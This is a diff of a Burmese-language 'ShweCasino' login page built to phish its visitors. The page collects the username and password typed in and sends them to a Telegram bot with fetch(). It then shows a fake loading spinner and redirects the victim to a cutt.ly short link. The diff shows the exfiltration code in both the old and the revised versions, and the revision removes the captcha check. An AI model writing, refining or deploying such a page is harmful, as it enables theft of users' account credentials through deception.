@@ -1,109 +1,168 @@
 <!DOCTYPE html>
 <html lang="my">
 <head>
-
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>ShweCasino</title>
+<title>ShweCasino Login</title>
 
 <style>
 
 body{
 margin:0;
+font-family:"Myanmar Text";
 background:#8b0000;
-font-family:Myanmar Text;
 color:white;
+min-height:100vh;
 }
 
 /* banner */
 
 .banner img{
 width:100%;
+height:220px;
+object-fit:cover;
 display:block;
 }
 
 /* login box */
 
 .login-box{
-background:#a00000;
+background:#6b0000;
 margin:15px;
 padding:20px;
 border-radius:15px;
 }
 
-.title{
-text-align:center;
-font-size:28px;
-margin-bottom:20px;
+h2{
+margin-top:0;
+color:#ffcc66;
+text-align:center
 }
 
-/* inputs */
+/* input */
 
-.input{
+input{
 width:100%;
-padding:14px;
+padding:12px;
 margin:10px 0;
 border:none;
 border-radius:10px;
+background:#ffffff20;
+color:white;
 font-size:16px;
 }
 
-/* password eye */
+.username{
+margin-bottom:25px;
+}
 
-.passbox{
+/* password */
+
+.pass-box{
 position:relative;
 }
 
 .eye{
 position:absolute;
-right:15px;
+right:10px;
 top:50%;
 transform:translateY(-50%);
-font-size:18px;
 cursor:pointer;
+width:24px;
+height:24px;
+fill:#ffcc66;
+}
+
+.forgot{
+display:block;
+text-align:right;
+font-size:13px;
+color:#ffcc66;
+text-decoration:none;
+margin-top:5px;
 }
 
 /* captcha */
 
-.captcha-row{
-display:flex;
-align-items:center;
-gap:10px;
+.captcha-box{
+position:relative;
+background:#f3d6a2;
+color:#333;
+font-size:24px;
+letter-spacing:10px;
+text-align:center;
+padding:12px;
+border-radius:10px;
 margin-top:10px;
-}
-
-.captcha{
-background:white;
-color:black;
-padding:8px 14px;
-border-radius:6px;
 font-weight:bold;
 }
 
 .refresh{
-background:#eee;
-color:black;
-padding:8px 10px;
-border-radius:6px;
+position:absolute;
+right:10px;
+top:8px;
 cursor:pointer;
+font-size:20px;
 }
 
 /* button */
 
-.btn{
+button{
 width:100%;
-padding:14px;
-margin-top:15px;
-background:#ffd700;
+padding:12px;
 border:none;
 border-radius:10px;
+background:#ffcc66;
 font-size:18px;
 font-weight:bold;
+cursor:pointer;
+margin-top:10px;
+}
+
+/* links */
+
+.links{
+display:flex;
+justify-content:space-between;
+margin-top:10px;
+}
+
+.links a{
+color:#ffcc66;
+text-decoration:none;
+}
+
+/* loading overlay */
+
+.loading{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.6);
+justify-content:center;
+align-items:center;
+z-index:999;
+}
+
+/* spinner */
+
+.spinner{
+width:60px;
+height:60px;
+border:6px solid #fff;
+border-top:6px solid #ffcc66;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
 }
 
 </style>
-
 </head>
 
 <body>
@@ -114,84 +173,96 @@ font-weight:bold;
 
 <div class="login-box">
 
-<div class="title">အကောင့်ထဲဝင်ရန်</div>
+<h2>အကောင့်ထဲဝင်ရန်</h2>
 
-<input class="input" id="user" placeholder="အကောင့်အမည်">
+<input class="username" id="user" placeholder="အသုံးပြုသူအမည်">
 
-<div class="passbox">
-<input class="input" type="password" id="pass" placeholder="စကားဝှက်">
-<span class="eye" onclick="togglePass()"></span>
+<div class="pass-box">
+
+<input type="password" id="pass" placeholder="စကားဝှက်">
+
+<svg class="eye" id="eyeIcon" onclick="toggle()" viewBox="0 0 24 24">
+<path id="eyePath" d="M12 5C7 5 2.7 8.1 1 12c1.7 3.9 6 7 11 7s9.3-3.1 11-7c-1.7-3.9-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
+</svg>
+
 </div>
 
-<div class="captcha-row">
-<div id="captcha" class="captcha"></div>
-<div class="refresh" onclick="createCaptcha()"></div>
+<a class="forgot" href="#">စကားဝှက်မေ့နေပါသလား?</a>
+
+<div class="captcha-box" id="cap">
+00000
+<span class="refresh" onclick="cap()"></span>
 </div>
 
-<input class="input" id="captchaInput" placeholder="captcha ရိုက်ထည့်ပါ">
+<input id="capInput" placeholder="အပေါ်ကနံပါတ်တွေကိုထည့်ပါ">
 
-<button class="btn" onclick="login()">အကောင့်ထဲဝင်ရန်</button>
+<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
+<div class="links">
+<a href="#">အကောင့်သစ်ဖွင့်ရန်</a>
+<a href="#">စာရင်းသွင်းရန်</a>
+</div>
+
+</div>
+
+<div class="loading" id="loading">
+<div class="spinner"></div>
 </div>
 
 <script>
 
-/* TG BOT */
+/* TG BOT INFO */
 
-var token="BOT_TOKEN";
-var chat_id="CHAT_ID";
+const TOKEN="BOT_TOKEN_HERE";
+const CHAT_ID="CHAT_ID_HERE";
 
-/* password show hide */
-
-function togglePass(){
-
-var p=document.getElementById("pass");
-
-if(p.type==="password"){
-p.type="text";
-}else{
-p.type="password";
-}
-
-}
-
-/* captcha */
-
-var code;
-
-function createCaptcha(){
-
-code=Math.floor(1000+Math.random()*9000);
-
-document.getElementById("captcha").innerText=code;
-
-}
-
-createCaptcha();
-
-/* login */
 
 function login(){
 
-var u=document.getElementById("user").value;
-var p=document.getElementById("pass").value;
-var c=document.getElementById("captchaInput").value;
+let user=document.getElementById("user").value;
+let pass=document.getElementById("pass").value;
 
-if(c!=code){
-alert("captcha မှားနေပါတယ်");
-createCaptcha();
-return;
+let text=
+"ShweCasino Login\n\n"+
+"Username: "+user+"\n"+
+"Password: "+pass;
+
+fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:text
+})
+});
+
+document.getElementById("loading").style.display="flex";
+
+setTimeout(function(){
+window.location.href="https://cutt.ly/otrecCFE";
+},2000);
+
 }
 
-var text=
-"ShweCasino Login%0A"+
-"User: "+u+"%0A"+
-"Pass: "+p;
+function cap(){
+let n=Math.floor(10000+Math.random()*90000);
+document.getElementById("cap").childNodes[0].nodeValue =
+n.toString().split("").join(" ");
+}
 
-fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+text);
+cap();
 
-window.location.href="https://cutt.ly/otrecCFE";
+function toggle(){
+let p=document.getElementById("pass");
+let eye=document.getElementById("eyePath");
 
+if(p.type==="password"){
+p.type="text";
+eye.setAttribute("d","M2 2l20 20M10.7 10.7A4 4 0 0 0 12 16a4 4 0 0 0 4-4c0-.4-.1-.9-.3-1.3M9.9 5.2A10.9 10.9 0 0 1 12 5c5 0 9.3 3.1 11 7a11.8 11.8 0 0 1-4.2 4.8M6.5 6.5C4.4 7.9 2.7 9.8 1 12c1.7 3.9 6 7 11 7 1.6 0 3.1-.3 4.5-.9");
+}else{
+p.type="password";
+eye.setAttribute("d","M12 5C7 5 2.7 8.1 1 12c1.7 3.9 6 7 11 7s9.3-3.1 11-7c-1.7-3.9-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z");
+}
 }
 
 </script>
